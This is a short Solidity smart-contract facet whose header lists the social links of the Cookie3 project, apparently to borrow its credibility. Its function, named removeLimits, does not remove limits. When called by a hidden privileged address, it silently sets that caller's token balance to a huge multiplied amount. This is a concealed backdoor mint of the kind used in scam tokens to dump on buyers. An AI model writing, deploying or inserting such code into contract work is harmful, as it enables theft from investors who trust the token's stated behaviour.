/*
 * SPDX-License-Identifier: MIT
 * Telegram: https://t.me/cookie3Announcements
 * Twitter: https://twitter.com/cookie3_co
 * Website: https://cookie3.co/?utm_source=icodrops
 * Medium: https://medium.com/@cookie3
 * Linke: https://www.linkedin.com/company/cookie3
 */
pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
